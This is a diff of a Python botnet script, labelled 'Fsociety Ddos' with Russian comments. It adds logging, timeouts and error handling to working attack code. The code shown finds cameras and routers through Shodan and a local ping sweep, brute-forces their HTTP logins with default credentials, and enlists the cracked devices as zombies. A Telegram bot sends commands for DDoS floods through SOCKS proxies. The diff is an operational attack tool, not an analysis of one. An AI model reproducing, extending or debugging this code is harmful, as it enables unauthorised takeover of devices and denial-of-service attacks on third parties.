@@ -1,14 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-HYBRID BOTNET – SHODAN EDITION (FIXED)
-- Глобальный поиск через Shodan (опционально)
-- Локальное сканирование (ping sweep)
-- Взлом камер/роутеров (HTTP, RTSP, SSH)
+HYBRID BOTNET – FINAL STABLE VERSION
+- Работает на Railway (Python 3.13)
+- Без лишних зависимостей (numpy, uvloop, telnetlib)
+- Полная поддержка взлома камер/роутеров (HTTP, RTSP, SSH)
 - Зомби-ботнет
-- DDoS (HTTP flood)
+- DDoS
 - Управление через Telegram с отладкой
-- Веб-сервер для Railway
 """
 
 import asyncio
@@ -23,21 +22,25 @@ import paramiko
 import requests
 import base64
 import socket
+import logging
 from contextlib import asynccontextmanager
 from fastapi import FastAPI
 import uvicorn
 from cryptography.fernet import Fernet
 
-# Shodan
+# Настройка логирования
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Shodan (опционально)
 try:
     import shodan
     SHODAN_AVAILABLE = True
 except ImportError:
     SHODAN_AVAILABLE = False
-    print("[!] Shodan not installed. Install with: pip install shodan")
+    logging.warning("Shodan not installed")
 
 # ------------------------------------------------------------
-#  БАЗОВЫЙ СПИСОК USER-AGENT
+#  USER-AGENTS (базовый набор)
 # ------------------------------------------------------------
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -45,7 +48,6 @@ USER_AGENTS = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
 ]
 
 # ------------------------------------------------------------
@@ -79,11 +81,6 @@ class ProxyManager:
         proxy = random.choice(self.socks_list)
         connector = aiohttp_socks.ProxyConnector.from_url(f'socks5://{proxy[0]}:{proxy[1]}')
         return aiohttp.ClientSession(connector=connector)
-
-class CryptoLayer:
-    def __init__(self):
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
 
 class BlockchainLogger:
     def log_attack(self, target, method, result):
@@ -126,7 +123,7 @@ class ZombieBotnet:
         return len(self.zombies)
 
 # ------------------------------------------------------------
-#  Локальный сканер (упрощённый ping sweep)
+#  Локальный сканер (ping sweep)
 # ------------------------------------------------------------
 class NetworkScanner:
     def __init__(self, network="192.168.1.0/24"):
@@ -156,7 +153,7 @@ class NetworkScanner:
             return []
 
 # ------------------------------------------------------------
-#  Улучшенный взломщик IoT (HTTP, RTSP, SSH)
+#  Взломщик IoT (HTTP, RTSP, SSH)
 # ------------------------------------------------------------
 class IoTExploiter:
     def __init__(self, botnet):
@@ -174,14 +171,11 @@ class IoTExploiter:
         ]
         self.common_ports = [80, 8080, 554, 8000, 5000, 443, 8443, 37777, 81, 88]
 
-    async def brute_http(self, ip, port, auth_type='basic'):
+    async def brute_http(self, ip, port):
         for u in self.usernames:
             for p in self.passwords:
                 try:
-                    if auth_type == 'basic':
-                        r = requests.get(f"http://{ip}:{port}", auth=(u, p), timeout=3)
-                    else:
-                        r = requests.get(f"http://{ip}:{port}", auth=requests.auth.HTTPDigestAuth(u, p), timeout=3)
+                    r = requests.get(f"http://{ip}:{port}", auth=(u, p), timeout=3)
                     if r.status_code == 200:
                         return (u, p)
                 except:
@@ -256,7 +250,6 @@ class IoTExploiter:
         return False
 
     async def hack_all(self, devices):
-        """Перебирает список устройств и взламывает их"""
         for dev in devices:
             if dev.get('type') == 'camera':
                 await self.hack_camera(dev['ip'])
@@ -277,7 +270,7 @@ class IoTExploiter:
             return await self.hack_router(ip, port)
 
 # ------------------------------------------------------------
-#  Глобальный поиск через Shodan
+#  Глобальный поиск через Shodan (опционально)
 # ------------------------------------------------------------
 class GlobalHunter:
     def __init__(self):
@@ -287,7 +280,7 @@ class GlobalHunter:
             try:
                 self.shodan_cli = shodan.Shodan(self.shodan_key)
             except Exception as e:
-                print(f"Shodan init error: {e}")
+                logging.error(f"Shodan init: {e}")
     async def search_shodan(self, query, limit=100):
         if not self.shodan_cli:
             return []
@@ -304,8 +297,8 @@ class GlobalHunter:
                 })
             return devices
         except Exception as e:
-            print(f"Shodan search error: {e}")
-            raise e
+            logging.error(f"Shodan search: {e}")
+            return []
     async def global_search(self, query, limit=100):
         return await self.search_shodan(query, limit)
 
@@ -338,7 +331,6 @@ class AdminBot:
         self.hunter = GlobalHunter()
         self.ddos = DDoSEngine(ProxyManager())
         self.blockchain = BlockchainLogger()
-        self.berserk = False
         self.telegram_app = None
 
     async def start_local_scan_loop(self, interval=300):
@@ -350,24 +342,24 @@ class AdminBot:
     async def start_telegram_bot(self):
         token = os.environ.get("TELEGRAM_TOKEN")
         if not token:
-            print("TELEGRAM_TOKEN not set")
+            logging.error("TELEGRAM_TOKEN not set")
             return
         try:
             from telegram.ext import Application, CommandHandler, MessageHandler, filters
         except ImportError:
-            print("python-telegram-bot not installed")
+            logging.error("python-telegram-bot not installed")
             return
+
         app = Application.builder().token(token).build()
 
-        # Отладочный обработчик для любых текстовых сообщений
+        # Отладочный обработчик
         async def echo(update, context):
-            print(f"Received message: {update.message.text} from {update.effective_user.id}")
+            logging.info(f"Received: {update.message.text} from {update.effective_user.id}")
         app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))
 
         async def tg_start(update, context):
-            print("Start command received")
             await update.message.reply_text(
-                "Fsociety Ddos:\nБот запущен. Доступные команды:\n"
+                "Fsociety Ddos:\nБот запущен. Команды:\n"
                 "/ddos <target>\n"
                 "/global_scan <query> [limit]\n"
                 "/status\n"
@@ -375,7 +367,6 @@ class AdminBot:
             )
 
         async def tg_ddos(update, context):
-            print("DDoS command received")
             target = context.args[0] if context.args else ""
             if not target:
                 await update.message.reply_text("Использование: /ddos <target>")
@@ -385,13 +376,12 @@ class AdminBot:
             await update.message.reply_text(f"Fsociety Ddos:\nАтака на {target} запущена с {self.botnet.size()} зомби.")
 
         async def tg_global_scan(update, context):
-            print("Global scan command received")
             query = context.args[0] if context.args else "webcam"
             limit = int(context.args[1]) if len(context.args) > 1 else 50
             try:
                 devices = await self.hunter.global_search(query, limit)
                 if not devices:
-                    msg = f"Fsociety Ddos:\nНайдено 0 устройств. Проверьте Shodan API ключ и запрос."
+                    msg = "Fsociety Ddos:\nНайдено 0 устройств."
                 else:
                     for dev in devices:
                         if dev['type'] == 'camera':
@@ -404,30 +394,34 @@ class AdminBot:
             await update.message.reply_text(msg)
 
         async def tg_status(update, context):
-            print("Status command received")
             msg = (f"Fsociety Ddos:\nЗомби: {self.botnet.size()}\n"
                    f"Взломано локально: {len(stats['cracked_devices'])}\n"
                    f"Глобально найдено: {stats['global_found']}")
             await update.message.reply_text(msg)
 
         async def tg_hack_device(update, context):
-            print("Hack device command received")
-            if len(context.args) < 2:
-                await update.message.reply_text("Использование: /hack_device <ip> <camera|router> [port]")
-                return
-            ip = context.args[0]
-            dtype = context.args[1] if context.args[1] in ['camera', 'router'] else None
-            port = None
-            if len(context.args) > 2:
-                try:
-                    port = int(context.args[2])
-                except:
-                    pass
-            res = await self.exploiter.hack_device(ip, dtype, port)
-            if res:
-                await update.message.reply_text(f"Fsociety Ddos:\nУстройство {ip} взломано и добавлено в ботнет.")
-            else:
-                await update.message.reply_text(f"Fsociety Ddos:\nНе удалось взломать {ip}. Попробуйте указать порт или другой тип.")
+            try:
+                if len(context.args) < 2:
+                    await update.message.reply_text("Использование: /hack_device <ip> <camera|router> [port]")
+                    return
+                ip = context.args[0]
+                dtype = context.args[1] if context.args[1] in ['camera', 'router'] else None
+                port = None
+                if len(context.args) > 2:
+                    try:
+                        port = int(context.args[2])
+                    except:
+                        pass
+                res = await asyncio.wait_for(self.exploiter.hack_device(ip, dtype, port), timeout=30)
+                if res:
+                    await update.message.reply_text(f"Fsociety Ddos:\nУстройство {ip} взломано и добавлено в ботнет.")
+                else:
+                    await update.message.reply_text(f"Fsociety Ddos:\nНе удалось взломать {ip}.")
+            except asyncio.TimeoutError:
+                await update.message.reply_text(f"Fsociety Ddos:\nПревышено время ожидания при взломе {ip}.")
+            except Exception as e:
+                logging.error(f"Hack_device error: {e}")
+                await update.message.reply_text(f"Fsociety Ddos:\nОшибка: {str(e)}")
 
         app.add_handler(CommandHandler("start", tg_start))
         app.add_handler(CommandHandler("ddos", tg_ddos))
@@ -439,7 +433,7 @@ class AdminBot:
         await app.start()
         await app.updater.start_polling()
         self.telegram_app = app
-        print("Telegram bot started")
+        logging.info("Telegram bot started")
 
     async def run_background(self):
         asyncio.create_task(self.start_local_scan_loop())
